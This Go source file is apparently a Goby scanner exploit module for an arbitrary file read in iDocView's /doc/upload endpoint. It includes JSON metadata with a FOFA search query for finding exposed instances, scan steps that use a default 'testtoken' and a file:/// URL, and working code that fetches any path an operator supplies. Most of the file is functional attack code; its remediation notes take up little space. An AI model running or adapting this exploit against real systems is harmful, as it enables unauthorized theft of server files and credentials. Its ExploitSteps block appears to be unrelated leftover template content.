package exploits

import (
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "IDocView /doc/upload File Read Vulnerability",
    "Description": "<p>iDocView is an online document preview system with an arbitrary file read vulnerability in its /doc/upload interface. Unauthorized attackers can exploit this interface with a default token to read sensitive file information on the server, leading to a highly insecure state.</p>",
    "Product": "IDocView",
    "Homepage": "https://www.idocv.com/",
    "DisclosureDate": "2023-12-11",
    "PostTime": "2024-11-01",
    "Author": "2987612621@qq.com",
    "FofaQuery": "title=\"I Doc View\" && body=\"I Doc View\"",
    "GobyQuery": "title=\"I Doc View\" && body=\"I Doc View\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows unauthorized attackers to read arbitrary files on the server, potentially leading to sensitive information disclosure and increasing the risk of further attacks on the system.</p>",
    "Recommendation": "<p>1.Follow the official patch release information, apply patches or upgrade to the latest version</p><p><a href=\"https://www.idocv.com/\">https://www.idocv.com/</a></p><p>2.Set access policies and whitelist access through security devices such as firewalls. </p><p>3.If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/iDocView/iDocView%20upload%E6%8E%A5%E5%8F%A3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "win.ini,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "C:/windows/win.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name=test.txt",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "[文件内容]",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6",
    "Translation": {
        "CN": {
            "Name": "IDocView /doc/upload 文件读取漏洞",
            "Product": "IDocView",
            "Description": "<p>iDocView 是一个在线文档预览系统，其 /doc/upload 接口存在任意文件读取漏洞。未授权的攻击者可以利用此接口并携带默认 token 读取服务器上的敏感文件信息，导致系统处于极度不安全的状态。</p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本&nbsp;<br></p><p><a href=\"https://www.idocv.com/\">https://www.idocv.com/</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>该漏洞允许未授权的攻击者读取服务器上的任意文件，可能导致敏感信息泄露，增加系统被进一步攻击的风险。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "IDocView /doc/upload File Read Vulnerability",
            "Product": "IDocView",
            "Description": "<p>iDocView is an online document preview system with an arbitrary file read vulnerability in its /doc/upload interface. Unauthorized attackers can exploit this interface with a default token to read sensitive file information on the server, leading to a highly insecure state.</p>",
            "Recommendation": "<p>1.Follow the official patch release information, apply patches or upgrade to the latest version</p><p><a href=\"https://www.idocv.com/\">https://www.idocv.com/</a><br></p><p>2.Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>3.If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>This vulnerability allows unauthorized attackers to read arbitrary files on the server, potentially leading to sensitive information disclosure and increasing the risk of further attacks on the system.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`

postOrGet_jwe1MsT7 := func(hostInfo *httpclient.FixUrl, filePath string) (string, error) {
  respTxt := ""
  URLPath := "/doc/upload?token=testtoken&url=file:///" + filePath + "&name=ceshipayload.txt"
  getRequestConfig := httpclient.NewGetRequestConfig(URLPath)
  getRequestConfig.VerifyTls = false
  getRequestConfig.FollowRedirect = false
  //请求
  response, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)

  if err != nil || response == nil {
    return "", err
  }

  re := regexp.MustCompile(`"srcUrl":"(.*?)","rid":`)
  match := re.FindStringSubmatch(response.RawBody)
  if len(match) < 1 {
    //正则失败
    return "", nil
  }

  URLPath2 := match[1]
  getRequestConfig_sjkfja := httpclient.NewGetRequestConfig(URLPath2)
  getRequestConfig_sjkfja.VerifyTls = false
  getRequestConfig_sjkfja.FollowRedirect = false

  response2, err2 := httpclient.DoHttpRequest(hostInfo, getRequestConfig_sjkfja)

  if err2 != nil || response2 == nil {
    return "", err2
  }

  respTxt = response2.RawBody
  // 注意：返回值为（最终要返回的读取结果，错误）
  return respTxt, nil
}

ExpManager.AddExploit(NewExploit(
  goutils.GetFileName(),
  expJson,
  func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
    // 此处需要修改：设置成功后的vulurl
    vulURL := "/doc/upload"
    // 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
    defaultModeMap := map[string]string{
      "C:/windows/win.ini": "; for 16-bit app support",
    }
    // 函数继承
    fileReadFunc := postOrGet_jwe1MsT7

    // 请注意：后续代码为模板代码，非特殊情况，无需更改
    // ----------------------------------------------------------------------------------------------------------------------------------------------------
    for filePath, fileText := range defaultModeMap {
      resp, err := fileReadFunc(u, filePath)
      if err != nil {
        continue
      }
      if strings.Contains(resp, fileText) {
        // 设置VULURL
        ss.VulURL = u.HostInfo + vulURL
        return true
      }
    }
    return false
  },

  func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
    var fileUrl string
    var fileText string
    mode := goutils.B2S(ss.Params["mode"])
    // 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
    defaultModeMap := map[string][2]string{
      "win.ini": {"C:/windows/win.ini", "; for 16-bit app support"},
    }
    // 此处需要修改：函数继承
    fileReadFunc := postOrGet_jwe1MsT7

    // 请注意，后续代码为模板固化，正常情况下均无需修改
    // ----------------------------------------------------------------------------------------------------------------------------------------------------
    if mode == "Customize" {
      fileUrl = goutils.B2S(ss.Params["Customize"])
    } else {
      if _, ok := defaultModeMap[mode]; ok {
        fileUrl = defaultModeMap[mode][0]
        fileText = defaultModeMap[mode][1]
      } else {
        expResult.Success = false
        return expResult
      }
    }

    // 获取返回结果url和返回请求头
    resp, err := fileReadFunc(expResult.HostInfo, fileUrl)
    if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
      expResult.Success = false
      return expResult
    }

    expResult.Success = true
    expResult.Output = resp
    return expResult
  },
))
}
